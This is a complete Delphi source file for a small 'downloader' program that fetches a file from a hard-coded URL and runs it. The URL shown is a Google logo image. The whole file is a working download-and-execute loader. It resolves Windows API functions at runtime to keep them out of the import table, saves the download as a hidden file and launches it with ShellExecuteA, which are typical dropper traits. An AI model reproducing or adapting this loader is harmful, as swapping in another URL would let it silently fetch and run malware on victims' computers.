program WininetDownloader;

{
  Coder: Counterstrikewi
  Thanks to: GreedyFly, Ms-Rem
  Compiled: Delphi 7 Command line compiler (with modified System and SysInit units)
  Website: www.delphibasics.info
}

type
  PSecurityAttributes = ^TSecurityAttributes;
  TSecurityAttributes = record
    nLength: LongWord;
    lpSecurityDescriptor: Pointer;
    bInheritHandle: Boolean;
  end;

  POverlapped = ^TOverlapped;
  TOverlapped = record
    Internal: LongWord;
    InternalHigh: LongWord;
    Offset: LongWord;
    OffsetHigh: LongWord;
    hEvent: LongWord;
  end;

const
  Kernel32 = 'kernel32.dll';
  sURL : PAnsiChar = 'http://www.google.co.za/intl/en_com/images/srpr/logo1w.png';
  sFile : PAnsiChar = 'GoogleLogo.png';
  
function GetModuleHandleA(lpModuleName: PAnsiChar): LongWord; stdcall; external Kernel32 name 'GetModuleHandleA';
function GetProcAddress(hModule: LongWord; lpProcName: PAnsiChar): Pointer; stdcall; external Kernel32 name 'GetProcAddress';

var
  xGetProcAddress : function (hModule: LongWord; lpProcName: PAnsiChar): Pointer; stdcall;
  xLoadLibraryA : function(lpLibFileName: PAnsiChar): LongWord; stdcall;
  xFreeLibrary : function(hLibModule: LongWord): Boolean; stdcall;
  xCreateFileA : function(lpFileName: PAnsiChar; dwDesiredAccess, dwShareMode: LongWord;
                          lpSecurityAttributes: PSecurityAttributes; dwCreationDisposition,
                          dwFlagsAndAttributes: LongWord; hTemplateFile: LongWord): LongWord; stdcall;
  xWriteFile : function(hFile: LongWord; const Buffer; nNumberOfBytesToWrite: LongWord;
                        var lpNumberOfBytesWritten: LongWord;
                        lpOverlapped: POverlapped): Boolean; stdcall;
  xCloseHandle : function(hObject: LongWord): Boolean; stdcall;
  xInternetOpenA : function(lpszAgent: PAnsiChar; dwAccessType: LongWord;
                            lpszProxy, lpszProxyBypass: PAnsiChar;
                            dwFlags: LongWord): Pointer; stdcall;
  xInternetOpenUrlA : function(hInet: Pointer; lpszUrl: PAnsiChar;
                               lpszHeaders: PAnsiChar; dwHeadersLength: LongWord;
                               dwFlags: LongWord; dwContext: LongWord): Pointer; stdcall;
  xInternetReadFile : function(hFile: Pointer; lpBuffer: Pointer;
                               dwNumberOfBytesToRead: LongWord;
                               var lpdwNumberOfBytesRead: LongWord): Boolean; stdcall;
  xInternetCloseHandle : function(hInet: Pointer): Boolean; stdcall;
  xShellExecuteA : function(hWnd: LongWord; Operation, FileName, Parameters,
                            Directory: PAnsiChar; ShowCmd: Integer): LongWord; stdcall;

  hKernel32, hWininet, hShell32 : LongWord;
  hSession, hURL: Pointer;
  Buffer: Array [1..1024] of Byte;
  BufferLen, FileHandle, BytesWritten: LongWord;

begin
  hKernel32 := GetModuleHandleA(Kernel32);
  @xGetProcAddress := GetProcAddress(hKernel32, 'GetProcAddress');
  @xLoadLibraryA := xGetProcAddress(hKernel32, 'LoadLibraryA');
  @xFreeLibrary := xGetProcAddress(hKernel32, 'FreeLibrary');
  @xCreateFileA := xGetProcAddress(hKernel32, 'CreateFileA');
  @xWriteFile := xGetProcAddress(hKernel32, 'WriteFile');
  @xCloseHandle := xGetProcAddress(hKernel32, 'CloseHandle');
  hWininet := xLoadLibraryA('wininet.dll');
  @xInternetOpenA := xGetProcAddress(hWininet, 'InternetOpenA');
  @xInternetOpenUrlA := xGetProcAddress(hWininet, 'InternetOpenUrlA');
  @xInternetReadFile := xGetProcAddress(hWininet, 'InternetReadFile');
  @xInternetCloseHandle := xGetProcAddress(hWininet, 'InternetCloseHandle');
  xFreeLibrary(hWininet);
  hShell32 := xLoadLibraryA('shell32.dll');
  @xShellExecuteA := xGetProcAddress(hShell32, 'ShellExecuteA');
  xFreeLibrary(hShell32);

  hSession := xInternetOpenA(nil, 0, nil, nil, 0);
  try
    hURL := xInternetOpenURLA(hSession, sURL, nil, 0, 0, 0);
    try
      FileHandle := xCreateFileA(sFile, $40000000, $00000002, nil, 2, $00000002, 0);
      BytesWritten := 0;
      repeat
        xInternetReadFile(hURL, @Buffer, SizeOf(Buffer), BufferLen);
        xWriteFile(FileHandle, Buffer, BufferLen, BytesWritten, nil);
      until BufferLen = 0;
      xCloseHandle(FileHandle);
    finally
      xInternetCloseHandle(hURL);
    end;
  finally
    xInternetCloseHandle(hSession);
  end;
  xShellExecuteA(0, 'open', sFile, nil, nil, 1);
end.
